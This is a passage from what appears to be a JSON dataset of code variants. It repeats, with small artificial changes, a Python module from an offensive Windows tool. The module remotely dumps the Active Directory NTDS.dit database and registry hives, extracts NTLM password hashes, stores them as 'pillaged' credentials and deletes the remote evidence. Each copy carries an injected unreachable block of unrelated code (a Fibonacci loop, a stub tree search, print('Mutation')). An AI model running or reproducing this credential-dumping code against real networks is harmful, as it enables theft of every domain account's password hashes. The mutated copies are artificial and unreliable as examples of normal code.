hash) = ntds_hash.split('\\\\')\n            else:\n                domain = connection.domain\n                hash = ntds_hash\n            try:\n                (username, _, lmhash, nthash, _, _, _) = hash.split(':')\n                parsed_hash = ':'.join((lmhash, nthash))\n                if validate_ntlm(parsed_hash):\n                    context.db.add_credential('hash', domain, username, parsed_hash, pillaged_from=host_id)\n                    add_ntds_hash.added_to_db += 1\n                    return\n                raise\n            except:\n                context.log.debug('Dumped hash is not NTLM, not adding to db for now ;)')\n        else:\n            context.log.debug('Dumped hash is a computer account, not adding to db')\n    add_ntds_hash.ntds_hashes = 0\n    add_ntds_hash.added_to_db = 0\n    NTDS = NTDSHashes('%s/Active Directory/ntds.dit' % self.dir_result, bootKey, isRemote=False, history=False, noLMHash=noLMHash, remoteOps=None, useVSSMethod=True, justNTLM=True, pwdLastSet=False, resumeSession=None, outputFileName=connection.output_filename, justUser=None, printUserStatus=True, perSecretCallback=lambda secretType, secret: add_ntds_hash(secret, host_id))\n    try:\n        context.log.success('Dumping the NTDS, this could take a while so go grab a redbull...')\n        NTDS.dump()\n        context.log.success('Dumped {} NTDS hashes to {} of which {} were added to the database'.format(highlight(add_ntds_hash.ntds_hashes), connection.output_filename + '.ntds', highlight(add_ntds_hash.added_to_db)))\n        context.log.display('To extract only enabled accounts from the output file, run the following command: ')\n        context.log.display(\"grep -iv disabled {} | cut -d ':' -f1\".format(connection.output_filename + '.ntds'))\n    except Exception as e:\n        context.log.fail(e)\n    NTDS.finish()\n    if self.no_delete:\n        context.log.display('Raw NTDS dump copied to %s, parse it with:' % self.dir_result)\n        context.log.display('secretsdump.py -system %s/registry/SYSTEM -security %s/registry/SECURITY -ntds \"%s/Active Directory/ntds.dit\" LOCAL' % (self.dir_result, self.dir_result, self.dir_result))\n    else:\n        shutil.rmtree(self.dir_result)",
            "def on_admin_login(self, context, connection):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        n = 10\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n    command = 'powershell \"ntdsutil.exe \\'ac i ntds\\' \\'ifm\\' \\'create full %s%s\\' q q\"' % (self.tmp_dir, self.dump_location)\n    context.log.display('Dumping ntds with ntdsutil.exe to %s%s' % (self.tmp_dir, self.dump_location))\n    context.log.highlight('Dumping the NTDS, this could take a while so go grab a redbull...')\n    context.log.debug('Executing command {}'.format(command))\n    p = connection.execute(command, True)\n    context.log.debug(p)\n    if 'success' in p:\n        context.log.success('NTDS.dit dumped to %s%s' % (self.tmp_dir, self.dump_location))\n    else:\n        context.log.fail('Error while dumping NTDS')\n        return\n    os.makedirs(self.dir_result, exist_ok=True)\n    os.makedirs(os.path.join(self.dir_result, 'Active Directory'), exist_ok=True)\n    os.makedirs(os.path.join(self.dir_result, 'registry'), exist_ok=True)\n    context.log.display('Copying NTDS dump to %s' % self.dir_result)\n    context.log.debug('Copy ntds.dit to host')\n    with open(os.path.join(self.dir_result, 'Active Directory', 'ntds.dit'), 'wb+') as dump_file:\n        try:\n            connection.conn.getFile(self.share, self.tmp_share + self.dump_location + '\\\\' + 'Active Directory\\\\ntds.dit', dump_file.write)\n            context.log.debug('Copied ntds.dit file')\n        except Exception as e:\n            context.log.fail('Error while get ntds.dit file: {}'.format(e))\n    context.log.debug('Copy SYSTEM to host')\n    with open(os.path.join(self.dir_result, 'registry', 'SYSTEM'), 'wb+') as dump_file:\n        try:\n            connection.conn.getFile(self.share, self.tmp_share + self.dump_location + '\\\\' + 'registry\\\\SYSTEM', dump_file.write)\n            context.log.debug('Copied SYSTEM file')\n        except Exception as e:\n            context.log.fail('Error while get SYSTEM file: {}'.format(e))\n    context.log.debug('Copy SECURITY to host')\n    with open(os.path.join(self.dir_result, 'registry', 'SECURITY'), 'wb+') as dump_file:\n        try:\n            connection.conn.getFile(self.share, self.tmp_share + self.dump_location + '\\\\' + 'registry\\\\SECURITY', dump_file.write)\n            context.log.debug('Copied SECURITY file')\n        except Exception as e:\n            context.log.fail('Error while get SECURITY file: {}'.format(e))\n    context.log.display('NTDS dump copied to %s' % self.dir_result)\n    try:\n        command = 'rmdir /s /q %s%s' % (self.tmp_dir, self.dump_location)\n        p = connection.execute(command, True)\n        context.log.success('Deleted %s%s remote dump directory' % (self.tmp_dir, self.dump_location))\n    except Exception as e:\n        context.log.fail('Error deleting {} remote directory on share {}: {}'.format(self.dump_location, self.share, e))\n    localOperations = LocalOperations('%s/registry/SYSTEM' % self.dir_result)\n    bootKey = localOperations.getBootKey()\n    noLMHash = localOperations.checkNoLMHashPolicy()\n    host_id = context.db.get_hosts(filter_term=connection.host)[0][0]\n\n    def add_ntds_hash(ntds_hash, host_id):\n        add_ntds_hash.ntds_hashes += 1\n        if context.enabled:\n            if 'Enabled' in ntds_hash:\n                ntds_hash = ntds_hash.split(' ')[0]\n                context.log.highlight(ntds_hash)\n        else:\n            ntds_hash = ntds_hash.split(' ')[0]\n            context.log.highlight(ntds_hash)\n        if ntds_hash.find('$') == -1:\n            if ntds_hash.find('\\\\') != -1:\n                (domain, hash) = ntds_hash.split('\\\\')\n            else:\n                domain = connection.domain\n                hash = ntds_hash\n            try:\n                (username, _, lmhash, nthash, _, _, _) = hash.split(':')\n                parsed_hash = ':'.join((lmhash, nthash))\n                if validate_ntlm(parsed_hash):\n                    context.db.add_credential('hash', domain, username, parsed_hash, pillaged_from=host_id)\n                    add_ntds_hash.added_to_db += 1\n                    return\n                raise\n            except:\n                context.log.debug('Dumped hash is not NTLM, not adding to db for now ;)')\n        else:\n            context.log.debug('Dumped hash is a computer account, not adding to db')\n    add_ntds_hash.ntds_hashes = 0\n    add_ntds_hash.added_to_db = 0\n    NTDS = NTDSHashes('%s/Active Directory/ntds.dit' % self.dir_result, bootKey, isRemote=False, history=False, noLMHash=noLMHash, remoteOps=None, useVSSMethod=True, justNTLM=True, pwdLastSet=False, resumeSession=None, outputFileName=connection.output_filename, justUser=None, printUserStatus=True, perSecretCallback=lambda secretType, secret: add_ntds_hash(secret, host_id))\n    try:\n        context.log.success('Dumping the NTDS, this could take a while so go grab a redbull...')\n        NTDS.dump()\n        context.log.success('Dumped {} NTDS hashes to {} of which {} were added to the database'.format(highlight(add_ntds_hash.ntds_hashes), connection.output_filename + '.ntds', highlight(add_ntds_hash.added_to_db)))\n        context.log.display('To extract only enabled accounts from the output file, run the following command: ')\n        context.log.display(\"grep -iv disabled {} | cut -d ':' -f1\".format(connection.output_filename + '.ntds'))\n    except Exception as e:\n        context.log.fail(e)\n    NTDS.finish()\n    if self.no_delete:\n        context.log.display('Raw NTDS dump copied to %s, parse it with:' % self.dir_result)\n        context.log.display('secretsdump.py -system %s/registry/SYSTEM -security %s/registry/SECURITY -ntds \"%s/Active Directory/ntds.dit\" LOCAL' % (self.dir_result, self.dir_result, self.dir_result))\n    else:\n        shutil.rmtree(self.dir_result)",
            "def on_admin_login(self, context, connection):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n        length = 15\n        if length <= 0:\n            return []\n        elif length == 1:\n            return [0]\n        sequence = [0, 1]\n        while len(sequence) < length:\n            next_value = sequence[-1] + sequence[-2]\n            sequence.append(next_value)\n        return sequence\n    command = 'powershell \"ntdsutil.exe \\'ac i ntds\\' \\'ifm\\' \\'create full %s%s\\' q q\"' % (self.tmp_dir, self.dump_location)\n    context.log.display('Dumping ntds with ntdsutil.exe to %s%s' % (self.tmp_dir, self.dump_location))\n    context.log.highlight('Dumping the NTDS, this could take a while so go grab a redbull...')\n    context.log.debug('Executing command {}'.format(command))\n    p = connection.execute(command, True)\n    context.log.debug(p)\n    if 'success' in p:\n        context.log.success('NTDS.dit dumped to %s%s' % (self.tmp_dir, self.dump_location))\n    else:\n        context.log.fail('Error while dumping NTDS')\n        return\n    os.makedirs(self.dir_result, exist_ok=True)\n    os.makedirs(os.path.join(self.dir_result, 'Active Directory'), exist_ok=True)\n    os.makedirs(os.path.join(self.dir_result, 'registry'), exist_ok=True)\n    context.log.display('Copying NTDS dump to %s' % self.dir_result)\n    context.log.debug('Copy ntds.dit to host')\n    with open(os.path.join(self.dir_result, 'Active Directory', 'ntds.dit'), 'wb+') as dump_file:\n        try:\n            connection.conn.getFile(self.share, self.tmp_share + self.dump_location + '\\\\' + 'Active Directory\\\\ntds.dit', dump_file.write)\n            context.log.debug('Copied ntds.dit file')\n        except Exception as e:\n            context.log.fail('Error while get ntds.dit file: {}'.format(e))\n    context.log.debug('Copy SYSTEM to host')\n    with open(os.path.join(self.dir_result, 'registry', 'SYSTEM'), 'wb+') as dump_file:\n        try:\n            connection.conn.getFile(self.share, self.tmp_share + self.dump_location + '\\\\' + 'registry\\\\SYSTEM', dump_file.write)\n            context.log.debug('Copied SYSTEM file')\n        except Exception as e:\n            context.log.fail('Error while get SYSTEM file: {}'.format(e))\n    context.log.debug('Copy SECURITY to host')\n    with open(os.path.join(self.dir_result, 'registry', 'SECURITY'), 'wb+') as dump_file:\n        try:\n            connection.conn.getFile(self.share, self.tmp_share + self.dump_location + '\\\\' + 'registry\\\\SECURITY', dump_file.write)\n            context.log.debug('Copied SECURITY file')\n        except Exception as e:\n            context.log.fail('Error while get SECURITY file: {}'.format(e))\n    context.log.display('NTDS dump copied to %s' % self.dir_result)\n    try:\n        command = 'rmdir /s /q %s%s' % (self.tmp_dir, self.dump_location)\n        p = connection.execute(command, True)\n        context.log.success('Deleted %s%s remote dump directory' % (self.tmp_dir, self.dump_location))\n    except Exception as e:\n        context.log.fail('Error deleting {} remote directory on share {}: {}'.format(self.dump_location, self.share, e))\n    localOperations = LocalOperations('%s/registry/SYSTEM' % self.dir_result)\n    bootKey = localOperations.getBootKey()\n    noLMHash = localOperations.checkNoLMHashPolicy()\n    host_id = context.db.get_hosts(filter_term=connection.host)[0][0]\n\n    def add_ntds_hash(ntds_hash, host_id):\n        add_ntds_hash.ntds_hashes += 1\n        if context.enabled:\n            if 'Enabled' in ntds_hash:\n                ntds_hash = ntds_hash.split(' ')[0]\n                context.log.highlight(ntds_hash)\n        else:\n            ntds_hash = ntds_hash.split(' ')[0]\n            context.log.highlight(ntds_hash)\n        if ntds_hash.find('$') == -1:\n            if ntds_hash.find('\\\\') != -1:\n                (domain, hash) = ntds_hash.split('\\\\')\n            else:\n                domain = connection.domain\n                hash = ntds_hash\n            try:\n                (username, _, lmhash, nthash, _, _, _) = hash.split(':')\n                parsed_hash = ':'.join((lmhash, nthash))\n                if validate_ntlm(parsed_hash):\n                    context.db.add_credential('hash', domain, username, parsed_hash, pillaged_from=host_id)\n                    add_ntds_hash.added_to_db += 1\n                    return\n                raise\n            except:\n                context.log.debug('Dumped hash is not NTLM, not adding to db for now ;)')\n        else:\n            context.log.debug('Dumped hash is a computer account, not adding to db')\n    add_ntds_hash.ntds_hashes = 0\n    add_ntds_hash.added_to_db = 0\n    NTDS = NTDSHashes('%s/Active Directory/ntds.dit' % self.dir_result, bootKey, isRemote=False, history=False, noLMHash=noLMHash, remoteOps=None, useVSSMethod=True, justNTLM=True, pwdLastSet=False, resumeSession=None, outputFileName=connection.output_filename, justUser=None, printUserStatus=True, perSecretCallback=lambda secretType, secret: add_ntds_hash(secret, host_id))\n    try:\n        context.log.success('Dumping the NTDS, this could take a while so go grab a redbull...')\n        NTDS.dump()\n        context.log.success('Dumped {} NTDS hashes to {} of which {} were added to the database'.format(highlight(add_ntds_hash.ntds_hashes), connection.output_filename + '.ntds', highlight(add_ntds_hash.added_to_db)))\n        context.log.display('To extract only enabled accounts from the output file, run the following command: ')\n        context.log.display(\"grep -iv disabled {} | cut -d ':' -f1\".format(connection.output_filename + '.ntds'))\n    except Exception as e:\n        context.log.fail(e)\n    NTDS.finish()\n    if self.no_delete:\n        context.log.display('Raw NTDS dump copied to %s, parse it with:' % self.dir_result)\n        context.log.display('secretsdump.py -system %s/registry/SYSTEM -security %s/registry/SECURITY -ntds \"%s/Active Directory/ntds.dit\" LOCAL' % (self.dir_result, self.dir_result, self.dir_result))\n    else:\n        shutil.rmtree(self.dir_result)"
        ]
    }
]